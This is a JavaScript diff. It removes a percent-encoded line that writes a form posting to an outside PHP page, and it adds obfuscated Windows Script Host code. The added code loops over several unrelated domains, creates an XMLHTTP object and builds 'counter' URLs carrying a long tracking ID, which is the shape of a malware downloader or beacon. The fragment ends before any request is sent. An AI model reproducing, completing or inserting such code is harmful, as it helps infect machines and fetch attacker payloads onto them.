@@ -1,1 +1,15 @@
-document.write(unescape('%3C%66%6F%72%6D%20%61%63%74%69%6F%6E%3D%22%68%74%74%70%3A%2F%2F%77%77%77%2E%33%64%63%72%65%61%74%65%61%6D%2E%63%6F%6D%2F%6D%65%78%2E%70%68%70%22%20%63%6C%61%73%73%3D%22%62%75%74%74%6F%6E%22%20%6D%65%74%68%6F%64%3D%22%70%6F%73%74%22%20%6E%61%6D%65%3D%22%73%75%62%6D%69%74%22%20%69%64%3D%22%73%75%62%6D%69%74%22%3E%27'));
+
+var x = "bv.truecompassdesigns.net selectairconditioning.com grandrapidsnonprofits.com delta.truecompassdesigns.net bandiloo.com".split(" ");
+var m = "0000001KzrnASzaY1QW7AaA2mCKagczTJaUtLwRsrRT59xCr-l5pY8hfDVZ_eN3cYAto2sj_fIrO0QiSmlddYZj5ISJuAs_WtZZWu3A-vTJkdUY8GOU9bw";
+for (var i=0; i<x.length; i++)
+{
+	var e = WScript.CreateObject("M"+"SXML2.XMLHTTP");	
+	try
+	{
+		var ter = '/';
+		var a = "h"+"t"+"tp"+":/"+ter+x[i]+ter+"c"+"o"+"unter/?"+m;
+	}
+	catch(e)
+	{
+	};
+};
